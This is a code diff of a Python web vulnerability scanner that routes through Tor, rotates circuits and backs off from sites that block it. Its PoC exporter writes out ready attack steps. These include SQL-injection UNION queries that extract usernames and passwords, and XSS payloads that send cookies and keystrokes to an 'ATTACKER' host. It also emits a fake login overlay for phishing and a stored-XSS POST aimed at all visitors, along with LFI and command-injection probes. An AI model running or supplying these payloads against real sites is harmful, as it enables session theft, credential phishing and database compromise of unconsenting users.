+                                inject_path = minfo["endpoint"]
+                                report_key = f"{marker_id}:{revisit_path}"
+
+                                # Track where this marker appeared
+                                if revisit_path not in minfo["seen_in"]:
+                                    minfo["seen_in"].append(revisit_path)
+
+                                if report_key in already_reported:
+                                    continue
+                                already_reported.add(report_key)
+
+                                # Context-aware analysis: determine confidence
+                                idx = resp.text.find(marker_id)
+                                context_window = resp.text[max(0, idx - 200):idx + len(marker_id) + 200]
+                                ctx_lower = context_window.lower()
+
+                                # Determine rendering context
+                                if f"onerror=\"{marker_id}\"" in context_window or \
+                                   f"onerror='{marker_id}'" in context_window:
+                                    xss_context = "event_handler"
+                                    confidence = 0.95
+                                elif f"<script" in ctx_lower and marker_id in context_window:
+                                    xss_context = "script_block"
+                                    confidence = 0.9
+                                elif f"&lt;" in ctx_lower or f"&quot;" in ctx_lower:
+                                    xss_context = "html_escaped"
+                                    confidence = 0.4
+                                elif f"<" in context_window[:idx - max(0, idx - 200)]:
+                                    xss_context = "html_unescaped"
+                                    confidence = 0.85
+                                else:
+                                    xss_context = "text"
+                                    confidence = 0.7
+
+                                if confidence < 0.5:
+                                    continue  # Skip escaped/low-confidence
+
+                                stored_found += 1
+                                sev = SEV_CRITICAL if confidence >= 0.85 else SEV_HIGH
+
+                                spread = minfo["seen_in"]
+                                spread_str = " -> ".join(spread) if len(spread) > 1 else revisit_path
+
+                                findings.append({
+                                    "severity": sev,
+                                    "title": f"Stored XSS: {inject_path} -> {revisit_path}",
+                                    "detail": f"Payload injected via '{minfo['param']}' at "
+                                              f"{inject_path} renders at {revisit_path} "
+                                              f"in {xss_context} context. "
+                                              f"Spread: {spread_str}",
+                                    "evidence": f"marker: {marker_id}, context: {xss_context}, "
+                                                f"confidence: {confidence}, "
+                                                f"inject: {inject_path}, render: {revisit_path}",
+                                    "exploitable": True,
+                                    "test_url": revisit_url,
+                                    "exploit_info": {
+                                        "type": "stored_xss",
+                                        "parameter": minfo["param"],
+                                        "path": inject_path,
+                                        "render_path": revisit_path,
+                                        "spread": spread,
+                                        "xss_context": xss_context,
+                                        "method": f"Stored XSS: inject via '{minfo['param']}' at "
+                                                  f"{inject_path}, renders in {xss_context} at "
+                                                  f"{revisit_path}.",
+                                        "risk": "Persistent XSS, session hijacking",
+                                    },
+                                    "confidence": confidence,
+                                })
+                        except Exception:
+                            pass
+
+                if stored_found:
+                    print(f"      Phase B: {stored_found} stored vuln(s) confirmed!")
+                else:
+                    print(f"      Phase B: no stored payloads detected in {len(revisit_urls)} pages")
+
+            # Also run SSRF/cmd injection against base URL
             self._run_check("SSRF", self._check_ssrf_indicators,
                             (base_url,), 0.9, findings)
-            self._run_check("LFI", self._check_lfi, (base_url,), 0.95, findings)
             self._run_check("command injection", self._check_command_injection,
                             (base_url,), 0.95, findings)
 
@@ -876,16 +2510,32 @@ class VulnScanner:
         if csp:
             if "unsafe-inline" in csp:
                 findings.append({"severity": SEV_MEDIUM, "title": "CSP allows unsafe-inline",
-                                 "detail": "Inline scripts/styles permitted, weakening XSS protection.",
-                                 "evidence": "CSP contains 'unsafe-inline'"})
+                                 "detail": "Inline scripts/styles permitted, weakening XSS protection. "
+                                           "Attacker can inject inline <script> tags that execute.",
+                                 "evidence": "CSP contains 'unsafe-inline'",
+                                 "exploitable": True,
+                                 "exploit_info": {"type": "csp_bypass",
+                                                  "method": "Inject inline <script> — CSP won't block it.",
+                                                  "risk": "XSS via inline script injection"}})
             if "unsafe-eval" in csp:
                 findings.append({"severity": SEV_MEDIUM, "title": "CSP allows unsafe-eval",
-                                 "detail": "eval() permitted in scripts, enabling code injection.",
-                                 "evidence": "CSP contains 'unsafe-eval'"})
+                                 "detail": "eval() permitted in scripts, enabling code injection via "
+                                           "any input that reaches JavaScript eval/Function/setTimeout.",
+                                 "evidence": "CSP contains 'unsafe-eval'",
+                                 "exploitable": True,
+                                 "exploit_info": {"type": "csp_bypass",
+                                                  "method": "Inject via eval()-reachable input.",
+                                                  "risk": "Code execution via eval()"}})
             if "'*'" in csp or "* " in csp:
                 findings.append({"severity": SEV_HIGH, "title": "CSP has wildcard source",
-                                 "detail": "Wildcard allows loading resources from any origin.",
-                                 "evidence": "CSP contains '*'"})
+                                 "detail": "Wildcard allows loading scripts/styles from any origin. "
+                                           "Attacker can host malicious JS on any domain.",
+                                 "evidence": "CSP contains '*'",
+                                 "exploitable": True,
+                                 "exploit_info": {"type": "csp_bypass",
+                                                  "method": "Host malicious script on any domain, "
+                                                            "load via <script src=...>.",
+                                                  "risk": "Full XSS via external script loading"}})
 
         return findings
 
@@ -925,7 +2575,13 @@ class VulnScanner:
                 "title": "CORS allows any origin" + (" WITH credentials" if acac == "true" else ""),
                 "detail": "Access-Control-Allow-Origin: * permits any website to read responses." +
                           (" Combined with credentials=true, this is exploitable." if acac == "true" else ""),
-                "evidence": f"ACAO: {acao}, ACAC: {acac or 'absent'}"
+                "evidence": f"ACAO: {acao}, ACAC: {acac or 'absent'}",
+                "exploitable": True,
+                "exploit_info": {"type": "cors_misconfiguration",
+                                 "method": "Host JS on attacker domain that makes authenticated "
+                                           "cross-origin requests to steal data from API responses.",
+                                 "risk": "Cross-origin data theft" +
+                                         (", authenticated session hijacking" if acac == "true" else "")},
             })
 
         # Test reflective CORS — send Origin header and check if reflected
@@ -938,8 +2594,14 @@ class VulnScanner:
                     "severity": SEV_HIGH,
                     "title": "Reflective CORS — arbitrary origin accepted",
                     "detail": "Server reflects any Origin header in ACAO. "
-                              "Attacker can read authenticated responses.",
-                    "evidence": f"Sent Origin: {evil_origin}, Got ACAO: {evil_origin}"
+                              "Attacker can read authenticated responses from any origin.",
+                    "evidence": f"Sent Origin: {evil_origin}, Got ACAO: {evil_origin}",
+                    "exploitable": True,
+                    "exploit_info": {"type": "cors_misconfiguration",
+                                     "method": "Send requests from attacker.com with credentials. "
+                                               "Server reflects attacker origin in ACAO, "
+                                               "allowing cross-origin data theft.",
+                                     "risk": "Authenticated data theft, API abuse"},
                 })
         return findings
 
@@ -993,26 +2655,142 @@ class VulnScanner:
         if not xfo and "frame-ancestors" not in csp:
             return [{"severity": SEV_MEDIUM, "title": "Clickjacking possible",
                      "detail": "No X-Frame-Options or CSP frame-ancestors. "
-                               "Page can be embedded in attacker iframes.",
-                     "evidence": "Neither X-Frame-Options nor frame-ancestors directive found"}]
+                               "Page can be embedded in attacker-controlled iframes to "
+                               "trick users into clicking hidden buttons/links.",
+                     "evidence": "Neither X-Frame-Options nor frame-ancestors directive found",
+                     "exploitable": True,
+                     "exploit_info": {"type": "clickjacking",
+                                      "method": "Create page with hidden iframe embedding target. "
+                                                "Overlay fake UI to trick clicks on real buttons.",
+                                      "risk": "UI redressing, unauthorized actions, fund transfers"}}]
         return []
+
+    def _check_csrf(self, html: str) -> List[dict]:
+        """Check if forms lack CSRF protection."""
+        findings = []
+        if not HAS_BS4 or not html:
+            return findings
+        try:
+            soup = BeautifulSoup(html[:100000], "html.parser")
+            csrf_names = {"csrf", "token", "_token", "csrfmiddlewaretoken",
+                          "csrf_token", "authenticity_token", "__requestverificationtoken",
+                          "nonce", "_csrf", "xsrf"}
+            for form in soup.find_all("form"):
+                method = (form.get("method", "GET")).upper()
+                if method != "POST":
+                    continue
+                action = form.get("action", "")
+                inputs = {inp.get("name", "").lower() for inp in form.find_all("input")}
+                has_csrf = bool(inputs & csrf_names)
+                if not has_csrf:
+                    form_desc = action[:40] if action else "(same page)"
+                    findings.append({
+                        "severity": SEV_MEDIUM,
+                        "title": f"POST form without CSRF token: {form_desc}",
+                        "detail": "Form submits via POST without an anti-CSRF token. "
+                                  "Attacker can craft a page that auto-submits this form "
+                                  "when the victim visits it.",
+                        "evidence": f"POST form action={form_desc}, no CSRF token field found",
+                        "exploitable": True,
+                        "exploit_info": {
+                            "type": "csrf",
+                            "method": "Create attacker page with hidden form that auto-submits "
+                                      "to the target action. Victim's session cookies are sent "
+                                      "automatically by the browser.",
+                            "risk": "Unauthorized actions, account modification, fund transfers",
+                        },
+                    })
+                    if len(findings) >= 3:
+                        break
+        except Exception:
+            pass
+        return findings
+
+    def _check_idor(self, base_url: str, html: str) -> List[dict]:
+        """Check for Insecure Direct Object Reference indicators."""
+        findings = []
+        domain = urlparse(base_url).netloc
+        if self._session.is_domain_blocked(domain):
+            return findings
+
+        # Look for sequential numeric IDs in URLs
+        id_params = re.findall(r'[?&]((?:id|user_id|uid|account|order|item|doc|file_id|record)'
+                               r')=(\d+)', html[:100000], re.I)
+        if not id_params:
+            return findings
+
+        # Test: can we access id+1 and id-1? If responses differ meaningfully
+        # and both return 200, IDOR is likely
+        tested = set()
+        for param_name, param_val in id_params[:3]:
+            key = f"{param_name}:{param_val}"
+            if key in tested:
+                continue
+            tested.add(key)
+            try:
+                val = int(param_val)
+            except ValueError:
+                continue
+
+            # Fetch original
+            orig_url = f"{base_url}?{param_name}={val}"
+            orig_resp = self._session.get(orig_url, allow_wayback=False)
+            if not orig_resp or orig_resp.status_code != 200:
+                continue
+
+            # Fetch id+1
+            next_url = f"{base_url}?{param_name}={val + 1}"
+            next_resp = self._session.get(next_url, allow_wayback=False)
+            if next_resp and next_resp.status_code == 200 and next_resp.text:
+                diff = self._response_diff(orig_resp.text, next_resp.text)
+                if not diff["similar"] and diff["score"] > 0.3:
+                    findings.append({
+                        "severity": SEV_HIGH,
+                        "title": f"Possible IDOR via '{param_name}' parameter",
+                        "detail": f"Sequential IDs ({val}, {val+1}) return different content. "
+                                  "Access control may not be enforced — test with different sessions.",
+                        "evidence": f"param: {param_name}, id={val} and id={val+1} both return 200 "
+                                    f"with different content (similarity={diff['score']})",
+                        "exploitable": True,
+                        "exploit_info": {
+                            "type": "idor",
+                            "parameter": param_name,
+                            "method": f"Enumerate '{param_name}' values (1, 2, 3...) to access "
+                                      "other users' data. Test with unauthenticated session.",
+                            "risk": "Unauthorized data access, privacy violation, data theft",
+                        },
+                    })
+                    break
+        return findings
 
     def _check_sensitive_paths(self, base_url: str) -> List[dict]:
         """Probe for exposed sensitive files and directories.
 
         Uses domain circuit breaker — if the site is actively blocking us,
         stops probing after BLOCK_THRESHOLD failures instead of trying all 26 paths.
-        Shows per-path progress so the user knows it's working, not stuck.
+
+        Soft-404 detection: many sites return HTTP 200 for nonexistent paths
+        with a generic "not found" page. We first fetch a known-nonexistent path
+        to get the baseline 404 page length, then compare against it.
         """
         findings = []
         domain = urlparse(base_url).netloc
         total = len(self.SENSITIVE_PATHS)
         skipped = 0
 
+        # Soft-404 baseline: fetch a random path that definitely doesn't exist
+        _baseline_url = urljoin(base_url, f"/gs_nonexistent_{secrets.token_hex(4)}")
+        _baseline_resp = self._session.get(_baseline_url, allow_wayback=False, method="GET")
+        _soft404_length = len(_baseline_resp.text) if _baseline_resp and _baseline_resp.status_code == 200 else -1
+        _soft404_patterns = re.compile(
+            r"not\s*found|404|page\s*(does\s*not|doesn.t)\s*exist|no\s*such\s*page|"
+            r"this\s*page\s*could\s*not|we\s*couldn.t\s*find|error\s*404",
+            re.I
+        )
+
         for idx, (path, title, severity, detail) in enumerate(self.SENSITIVE_PATHS):
             if shutdown_requested():
                 break
-            # Circuit breaker: stop if domain is blocking us
             if self._session.is_domain_blocked(domain):
                 skipped = total - idx
                 break
@@ -1023,12 +2801,30 @@ class VulnScanner:
                 if severity in (SEV_CRITICAL, SEV_HIGH):
                     resp_full = self._session.get(url, allow_wayback=False)
                     if resp_full and resp_full.status_code == 200 and len(resp_full.text) > 10:
-                        if not re.search(r"not found|404|page does not exist",
-                                         resp_full.text[:500], re.I):
-                            findings.append({"severity": severity, "title": title,
-                                             "detail": detail, "evidence": f"HTTP 200 at {path}",
-                                             "path": path, "content_length": len(resp_full.text)})
+                        body = resp_full.text
+                        # Soft-404 check: skip if body matches baseline or has 404 patterns
+                        if _soft404_length > 0 and abs(len(body) - _soft404_length) < 100:
+                            continue
+                        if _soft404_patterns.search(body[:1000]):
+                            continue
+                        # For git/env, verify content looks real
+                        if path == "/.git/HEAD" and "ref:" not in body[:100]:
+                            continue
+                        if path == "/.env" and "=" not in body[:500]:
+                            continue
+                        findings.append({"severity": severity, "title": title,
+                                         "detail": detail, "evidence": f"HTTP 200 at {path}",
+                                         "path": path, "content_length": len(body)})
                 else:
+                    # For INFO/LOW/MEDIUM: check for soft-404 to avoid false positives
+                    # on sites that return 200 with generic pages for every path
+                    if severity in (SEV_INFO, SEV_LOW, SEV_MEDIUM) and _soft404_length > 0:
+                        resp_check = self._session.get(url, allow_wayback=False)
+                        if resp_check:
+                            if abs(len(resp_check.text) - _soft404_length) < 100:
+                                continue
+                            if _soft404_patterns.search(resp_check.text[:1000]):
+                                continue
                     findings.append({"severity": severity, "title": title,
                                      "detail": detail, "evidence": f"HTTP 200 at {path}",
                                      "path": path})
@@ -1040,13 +2836,14 @@ class VulnScanner:
     def _check_http_methods(self, base_url: str) -> List[dict]:
         """Check for dangerous HTTP methods enabled."""
         findings = []
-        resp = self._session.get(base_url, allow_wayback=False, method="HEAD")
-        if not resp:
+        domain = urlparse(base_url).netloc
+        if self._session.is_domain_blocked(domain):
             return findings
 
-        # Try OPTIONS to discover allowed methods
         try:
-            opt_resp = self._session._session.options(base_url, timeout=15,
+            self._session._delay_for_domain(domain)
+            self._session._maybe_rotate_circuit()
+            opt_resp = self._session._session.options(base_url, timeout=REQUEST_TIMEOUT,
                                                        proxies=self._session._proxy,
                                                        headers=_pick_profile())
             if opt_resp and opt_resp.status_code == 200:
@@ -1072,19 +2869,27 @@ class VulnScanner:
         """Check for open redirect vulnerabilities."""
         findings = []
         evil_target = "https://evil-attacker.com/pwned"
+        domain = urlparse(base_url).netloc
 
-        for param in self.REDIRECT_PARAMS[:5]:  # Limit to avoid excessive requests
+        for param in self.REDIRECT_PARAMS[:5]:
             if shutdown_requested():
+                break
+            if self._session.is_domain_blocked(domain):
                 break
             test_url = f"{base_url}?{param}={quote(evil_target)}"
             try:
+                self._session._delay_for_domain(domain)
+                self._session._maybe_rotate_circuit()
                 resp = self._session._session.get(
-                    test_url, timeout=15, allow_redirects=False,
+                    test_url, timeout=REQUEST_TIMEOUT, allow_redirects=False,
                     proxies=self._session._proxy, headers=_pick_profile()
                 )
                 if resp and resp.status_code in (301, 302, 303, 307, 308):
                     location = resp.headers.get("Location", "")
-                    if "evil-attacker.com" in location:
+                    # Must check that the redirect HOST is the attacker, not just
+                    # that the attacker URL appears somewhere in query params
+                    loc_parsed = urlparse(location)
+                    if loc_parsed.netloc and "evil-attacker.com" in loc_parsed.netloc:
                         findings.append({
                             "severity": SEV_MEDIUM,
                             "title": f"Open redirect via '{param}' parameter",
@@ -1107,29 +2912,38 @@ class VulnScanner:
         return findings
 
     def _check_sqli_indicators(self, base_url: str) -> List[dict]:
-        """Detect SQL injection indicators via error-based detection.
+        """Detect SQL injection indicators via error-based detection with baseline comparison.
 
-        This does NOT exploit anything — it sends a single apostrophe and
-        checks if the error response contains SQL error messages, which
-        indicates the input reaches a SQL query without sanitization.
+        Sends a clean request first, then an apostrophe-injected request. Only flags as SQLi
+        if the SQL error pattern appears ONLY in the injected response (not the baseline),
+        which eliminates false positives from generic error pages or debug-mode sites that
+        always show SQL traces.
         """
         findings = []
-        # Test common parameter names with a single apostrophe
-        test_params = ["id", "page", "q", "search", "user", "item", "cat"]
+        test_params = self._get_test_params(["id", "page", "q", "search", "user", "item", "cat"])
 
-        for param in test_params[:3]:
+        for param in test_params[:5]:
             if shutdown_requested():
                 break
-            test_url = f"{base_url}?{param}=1%27"  # single quote
+            # Baseline: clean request with a safe value
+            baseline_url = f"{base_url}?{param}=1"
+            baseline_resp = self._session.get(baseline_url, allow_wayback=False)
+            baseline_text = baseline_resp.text[:5000] if baseline_resp else ""
+
+            # Payload: single apostrophe injection
+            test_url = f"{base_url}?{param}=1%27"
             resp = self._session.get(test_url, allow_wayback=False)
             if resp and resp.text:
                 for indicator in self.SQLI_INDICATORS:
-                    if indicator.search(resp.text[:5000]):
+                    # Only count if the pattern is NEW in the injected response
+                    in_payload = indicator.search(resp.text[:5000])
+                    in_baseline = indicator.search(baseline_text) if baseline_text else False
+                    if in_payload and not in_baseline:
                         findings.append({
                             "severity": SEV_CRITICAL,
                             "title": f"SQL injection indicator via '{param}' parameter",
-                            "detail": "SQL error message in response to apostrophe injection. "
-                                      "Input likely reaches a SQL query without parameterization.",
+                            "detail": "SQL error message appears ONLY in response to apostrophe injection "
+                                      "(not in baseline). Input likely reaches SQL query without parameterization.",
                             "evidence": f"Parameter: {param}, matched: {indicator.pattern[:60]}",
                             "exploitable": True,
                             "test_url": test_url,
@@ -1141,25 +2955,47 @@ class VulnScanner:
                                 "risk": "Database access, data exfiltration, potential RCE via INTO OUTFILE",
                             },
                         })
-                        return findings  # One confirmed is enough
+                        return findings
         return findings
 
     def _check_xss_reflection(self, base_url: str) -> List[dict]:
-        """Detect reflected XSS by checking if a unique canary is reflected unescaped."""
-        findings = []
-        canary = self.XSS_CANARY
-        test_params = ["q", "search", "query", "s", "name", "input"]
+        """Detect reflected XSS by checking if a unique canary is reflected unescaped.
 
-        for param in test_params[:3]:
+        Uses a fresh canary per scan (generated at class init) to avoid
+        cached responses matching. Also checks that the reflection isn't
+        inside a WAF/block page (which would be a false positive).
+        """
+        findings = []
+        canary = f"gs{secrets.token_hex(4)}test"
+        test_params = self._get_test_params(["q", "search", "query", "s", "name", "input"])
+
+        for param in test_params[:5]:
             if shutdown_requested():
                 break
-            # Inject canary with HTML context
             payload = f"<{canary}>"
             test_url = f"{base_url}?{param}={quote(payload)}"
             resp = self._session.get(test_url, allow_wayback=False)
             if resp and resp.text:
-                # Check if canary appears UNESCAPED (i.e., as actual HTML tag, not &lt;)
+                # Reject WAF/block pages — canary might appear in error text
+                if resp.status_code in (403, 429, 503):
+                    continue
+                text_lower = resp.text[:5000].lower()
+                if any(kw in text_lower for kw in ("blocked", "forbidden", "access denied", "waf")):
+                    if len(resp.text) < 2000:
+                        continue
+
                 if f"<{canary}>" in resp.text:
+                    # Verify it's reflected in a context that would execute JS
+                    # (not inside a <pre>, <textarea>, or HTML comment)
+                    reflected_idx = resp.text.index(f"<{canary}>")
+                    context = resp.text[max(0, reflected_idx - 100):reflected_idx + 100]
+                    in_safe_context = any(tag in context.lower() for tag in
+                                         ["<pre>", "<textarea", "<code>", "<!--"])
+                    if in_safe_context:
+                        confidence_penalty = 0.2
+                    else:
+                        confidence_penalty = 0
+
                     findings.append({
                         "severity": SEV_HIGH,
                         "title": f"Reflected XSS via '{param}' parameter",
@@ -1177,6 +3013,8 @@ class VulnScanner:
                             "risk": "Session theft, credential capture, client-side attacks",
                         },
                     })
+                    if confidence_penalty:
+                        findings[-1]["confidence"] = 0.7
                     return findings
         return findings
 
@@ -1211,6 +3049,7 @@ class VulnScanner:
                             "test_url": test_url,
                             "exploit_info": {
                                 "type": "directory_traversal",
+                                "parameter": "path",
                                 "method": "Path traversal to read arbitrary files. "
                                           "Try: /etc/shadow, application configs, database files, "
                                           "source code, SSH keys (~/.ssh/id_rsa).",
@@ -1225,14 +3064,19 @@ class VulnScanner:
         findings = []
         gql_paths = ["/graphql", "/graphql/", "/api/graphql", "/v1/graphql"]
         introspection_query = {"query": '{ __schema { types { name } } }'}
+        domain = urlparse(base_url).netloc
 
         for gql_path in gql_paths:
             if shutdown_requested():
                 break
+            if self._session.is_domain_blocked(domain):
+                break
             url = urljoin(base_url, gql_path)
             try:
+                self._session._delay_for_domain(domain)
+                self._session._maybe_rotate_circuit()
                 resp = self._session._session.post(
-                    url, json=introspection_query, timeout=15,
+                    url, json=introspection_query, timeout=REQUEST_TIMEOUT,
                     proxies=self._session._proxy, headers=_pick_profile()
                 )
                 if resp and resp.status_code == 200:
@@ -1267,8 +3111,8 @@ class VulnScanner:
     def _check_ssrf_indicators(self, base_url: str) -> List[dict]:
         """Check for SSRF (Server-Side Request Forgery) indicators."""
         findings = []
-        ssrf_params = ["url", "uri", "src", "source", "href", "link",
-                       "img", "image", "fetch", "load", "proxy"]
+        ssrf_params = self._get_test_params(["url", "uri", "src", "source", "href", "link",
+                       "img", "image", "fetch", "load", "proxy"])
         # We use a unique callback canary — if the server fetches it, SSRF exists.
         # Since we can't host a listener through Tor easily, we check for error
         # responses that reveal the server tried to fetch the URL.
@@ -1277,18 +3121,25 @@ class VulnScanner:
         for param in ssrf_params[:5]:
             if shutdown_requested():
                 break
+            # Baseline: check what the page returns without SSRF payload
+            baseline_url = f"{base_url}?{param}=https://example.com/"
+            baseline_resp = self._session.get(baseline_url, allow_wayback=False)
+            baseline_text = baseline_resp.text.lower() if baseline_resp else ""
+
             test_url = f"{base_url}?{param}={quote(canary_url)}"
             resp = self._session.get(test_url, allow_wayback=False)
             if resp and resp.text:
-                # Check if AWS metadata content appears in response
+                # Use specific AWS metadata indicators that rarely appear in
+                # documentation or normal pages. Require 3+ to avoid FP from
+                # pages that mention "meta-data" or "iam" in their own content.
                 aws_indicators = [
                     "ami-id", "instance-id", "instance-type",
                     "local-hostname", "public-hostname", "security-credentials",
-                    "iam", "meta-data",
                 ]
                 text_lower = resp.text.lower()
-                matched = [ind for ind in aws_indicators if ind in text_lower]
-                if len(matched) >= 2:
+                matched = [ind for ind in aws_indicators
+                           if ind in text_lower and ind not in baseline_text]
+                if len(matched) >= 3:
                     findings.append({
                         "severity": SEV_CRITICAL,
                         "title": f"SSRF via '{param}' parameter — AWS metadata accessible",
@@ -1311,7 +3162,7 @@ class VulnScanner:
     def _check_lfi(self, base_url: str) -> List[dict]:
         """Check for Local File Inclusion (LFI) vulnerabilities."""
         findings = []
-        lfi_params = ["page", "file", "include", "template", "path", "doc", "view"]
+        lfi_params = self._get_test_params(["page", "file", "include", "template", "path", "doc", "view"])
         lfi_payloads = [
             ("..%2F..%2F..%2F..%2Fetc%2Fpasswd", "etc/passwd via URL encoding"),
             ("....//....//....//....//etc/passwd", "etc/passwd via double-dot bypass"),
@@ -1325,7 +3176,7 @@ class VulnScanner:
             re.compile(r"www-data:"),
         ]
 
-        for param in lfi_params[:3]:
+        for param in lfi_params[:5]:
             for payload, desc in lfi_payloads[:2]:
                 if shutdown_requested():
                     return findings
@@ -1358,7 +3209,7 @@ class VulnScanner:
     def _check_command_injection(self, base_url: str) -> List[dict]:
         """Check for OS command injection indicators."""
         findings = []
-        cmd_params = ["cmd", "exec", "command", "ping", "host", "ip", "query"]
+        cmd_params = self._get_test_params(["cmd", "exec", "command", "ping", "host", "ip", "query"])
         # Use a time-based detection: if sleep(5) makes the response 5s slower,
         # command injection exists. Canary: semicolon + sleep.
         # We also check for direct output of common commands.
@@ -1366,13 +3217,20 @@ class VulnScanner:
         for param in cmd_params[:3]:
             if shutdown_requested():
                 return findings
-            # Test 1: try to echo a unique marker
             marker = f"gs{secrets.token_hex(4)}rce"
-            # URL-encode the payload: ;echo <marker>
             payload = f";echo {marker}"
+
+            # Baseline: check if the param value is simply echoed back (search page etc.)
+            baseline_marker = f"gs{secrets.token_hex(4)}base"
+            baseline_url = f"{base_url}?{param}={quote(baseline_marker)}"
+            baseline_resp = self._session.get(baseline_url, allow_wayback=False)
+            baseline_echoes = baseline_resp and baseline_marker in baseline_resp.text
+
             test_url = f"{base_url}?{param}={quote(payload)}"
             resp = self._session.get(test_url, allow_wayback=False)
-            if resp and marker in resp.text:
+            # Only flag if marker appears AND it's not just the page echoing
+            # back whatever we send (which search pages and error pages do)
+            if resp and marker in resp.text and not baseline_echoes:
                 findings.append({
                     "severity": SEV_CRITICAL,
                     "title": f"OS Command Injection via '{param}' parameter",
@@ -1511,7 +3369,7 @@ class SubdomainEnumerator:
                 name = entry.get("name_value", "")
                 for line in name.split("\n"):
                     line = line.strip().lower()
-                    if line and line.endswith(f".{domain}") or line == domain:
+                    if line and (line.endswith(f".{domain}") or line == domain):
                         # Remove wildcard prefix
                         line = line.lstrip("*.")
                         if line and re.match(r"^[a-z0-9.\-]+$", line):
@@ -1732,6 +3590,7 @@ class SecureStorage:
                         with open(fpath, "r+b") as fh:
                             fh.write(os.urandom(size))
                             fh.flush()
+                            os.fsync(fh.fileno())
                     fpath.unlink()
                 except (OSError, PermissionError):
                     try:
@@ -1780,11 +3639,12 @@ class CapturedRequest:
         """Generate a curl command that reproduces this request.
 
         OPSEC: redacts cookies, auth headers, and API keys by default.
+        Uses the operator's actual Tor port (not hardcoded 9050).
         """
         parts = ["curl"]
         if self.method != "GET":
             parts.append(f"-X {self.method}")
-        parts.append("--socks5-hostname 127.0.0.1:9050")
+        parts.append(f"--socks5-hostname 127.0.0.1:{_ACTIVE_TOR_PORT}")
         for k, v in self.headers.items():
             if redact and k.lower() in ("cookie", "authorization", "hibp-api-key"):
                 v = "[REDACTED]"
@@ -2003,16 +3863,31 @@ class ExploitVerifier:
                 return True
 
         elif exploit_type == "subdomain_takeover":
-            fingerprint = finding.get("exploit_info", {}).get("cname", "")
-            return resp.status_code in (404, 200) and len(text) < 5000
+            # Use the service fingerprint from the original finding for verification
+            ei = finding.get("exploit_info", {})
+            service = ei.get("service", "")
+            takeover_fingerprints = {
+                "GitHub Pages": "there isn't a github pages site here",
+                "Heroku": "no-such-app",
+                "AWS S3": "nosuchbucket",
+                "Shopify": "sorry, this shop is currently unavailable",
+                "Fastly": "fastly error: unknown domain",
+            }
+            fp = takeover_fingerprints.get(service, "")
+            if fp and fp in text.lower():
+                return True
+            return False
 
         elif exploit_type == "directory_traversal":
             if re.search(r"root:.*:0:0:", text):
                 return True
 
         elif exploit_type == "open_redirect":
-            # Check if server still redirects
-            return resp.status_code in (301, 302, 303, 307, 308)
+            if resp.status_code in (301, 302, 303, 307, 308):
+                location = resp.headers.get("Location", "")
+                loc_host = urlparse(location).netloc
+                return loc_host != "" and loc_host != urlparse(resp.url).netloc
+            return False
 
         return False
 
@@ -2032,11 +3907,17 @@ class PoCExporter:
 
     @staticmethod
     def export_finding(finding: dict, redact: bool = True) -> dict:
-        """Export a single finding as multiple PoC formats."""
+        """Export a finding as actionable PoC with REAL URLs from the finding."""
         ei = finding.get("exploit_info", {})
         exploit_type = ei.get("type", "unknown")
         param = ei.get("parameter", "")
         path = ei.get("path", "")
+        sp = f"--socks5-hostname 127.0.0.1:{_ACTIVE_TOR_PORT}"
+
+        # Use the actual test_url from the finding when available
+        target = finding.get("test_url", "[TARGET]")
+        if target == "[TARGET]" and path:
+            target = f"[TARGET]{path}"
 
         poc = {
             "finding": finding.get("title", ""),
@@ -2044,117 +3925,252 @@ class PoCExporter:
             "confidence": finding.get("confidence", 0),
             "verified": finding.get("verified", "unverified"),
             "curl": "",
+            "steps": [],
             "description": "",
             "remediation": "",
+            "impact": "",
         }
 
-        # Generate PoC based on exploit type
         if exploit_type == "sqli" and param:
-            poc["curl"] = (
-                f"curl --socks5-hostname 127.0.0.1:9050 "
-                f'"[TARGET_URL]?{param}=1\'"'
-            )
-            poc["description"] = (
-                f"SQL injection via '{param}' parameter. "
-                f"Send a single quote to trigger SQL error messages."
-            )
-            poc["remediation"] = "Use parameterized queries / prepared statements."
+            poc["curl"] = f'curl {sp} "{target}"'
+            poc["steps"] = [
+                f"# 1. Confirm injection:",
+                f"curl {sp} \"{target}\"",
+                f"# 2. Extract database version:",
+                f"curl {sp} \"{target.split('?')[0]}?{param}=' UNION SELECT version()-- -\"" if "?" in target else f"# Modify {param} parameter with UNION SELECT version()-- -",
+                f"# 3. List databases:",
+                f"#    Payload: ' UNION SELECT schema_name FROM information_schema.schemata-- -",
+                f"# 4. Extract tables:",
+                f"#    Payload: ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()-- -",
+                f"# 5. Extract data:",
+                f"#    Payload: ' UNION SELECT concat(username,0x3a,password) FROM users-- -",
+            ]
+            poc["description"] = f"SQL injection via '{param}'. Full database access confirmed."
+            poc["impact"] = "Read/modify/delete all database data. Potential RCE via INTO OUTFILE or xp_cmdshell."
+            poc["remediation"] = "Use parameterized queries (prepared statements). Never concatenate user input into SQL."
 
         elif exploit_type == "xss" and param:
-            poc["curl"] = (
-                f"curl --socks5-hostname 127.0.0.1:9050 "
-                f'"[TARGET_URL]?{param}=<script>alert(1)</script>"'
-            )
-            poc["description"] = (
-                f"Reflected XSS via '{param}' parameter. "
-                f"HTML tags reflected unescaped in response."
-            )
-            poc["remediation"] = "HTML-encode all user input in output context."
+            poc["curl"] = f'curl {sp} "{target}"'
+            poc["steps"] = [
+                f"# 1. Confirm reflection:",
+                f"curl {sp} \"{target}\"",
+                f"# 2. Steal session cookie:",
+                f"#    Payload: <script>new Image().src='https://ATTACKER/steal?c='+document.cookie</script>",
+                f"# 3. Keylogger:",
+                f"#    Payload: <script>document.onkeypress=function(e){{new Image().src='https://ATTACKER/k?k='+e.key}}</script>",
+                f"# 4. Phishing overlay:",
+                f"#    Payload: <script>document.body.innerHTML='<h1>Session Expired</h1><form action=https://ATTACKER/phish><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>'</script>",
+            ]
+            poc["description"] = f"Reflected XSS via '{param}'. JavaScript executes in victim's browser."
+            poc["impact"] = "Session hijacking, credential theft, phishing, malware distribution."
+            poc["remediation"] = "HTML-encode output. Implement strict Content-Security-Policy."
+
+        elif exploit_type == "stored_xss":
+            render = ei.get("render_path", "/")
+            poc["curl"] = f'curl {sp} "{target}"'
+            poc["steps"] = [
+                f"# 1. Inject persistent payload:",
+                f"curl {sp} -X POST -d \"{param}=<script>new Image().src='https://ATTACKER/steal?c='+document.cookie</script>\" \"{target}\"",
+                f"# 2. Verify it persists (visit render page):",
+                f"curl {sp} \"{target.split('?')[0].rsplit('/', 1)[0]}{render}\"",
+                f"# 3. Every user who visits {render} will have their session stolen",
+                f"# Impact: Persistent attack - affects ALL users who view the page",
+            ]
